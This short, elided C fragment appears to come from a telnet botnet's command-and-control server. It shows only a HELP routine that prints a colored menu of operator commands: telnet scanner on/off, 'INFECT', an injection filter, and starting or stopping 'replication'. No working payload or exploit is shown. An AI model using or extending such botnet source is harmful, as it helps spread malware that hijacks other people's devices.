    ...
    while(j!=i-1) {
		...
		while(fdgets(buf, sizeof buf, datafd) > 0)
		{
			...
			if(strstr(buf, "HELP")) {
				...
				sprintf(helpline11, "\x1b[31m~[TELNET SCANNER]~ \x1b[37m!* SCANNER ON | OFF\r\n");
				sprintf(helpline12, "\x1b[31m~[CLEARSCREEN]~ \x1b[37mCLEAR\r\n");
				sprintf(helpline13, "\x1b[31m~[LOGOUT]~ \x1b[37mLOGOUT\r\n");
				sprintf(helpline14, "\x1b[31m~[TELNET INFECT]~ \x1b[37mINFECT\r\n");
				sprintf(helpline15, "\x1b[31m~[INECTION FILTER]~ \x1b[37mFILTER\r\n");
				sprintf(helpline16, "\x1b[31m~[START REPLICATION]~ \x1b[37mSCAN ON\r\n");
				sprintf(helpline17, "\x1b[31m~[STOP REPLICATION]~ \x1b[37mSCAN OFF\r\n");
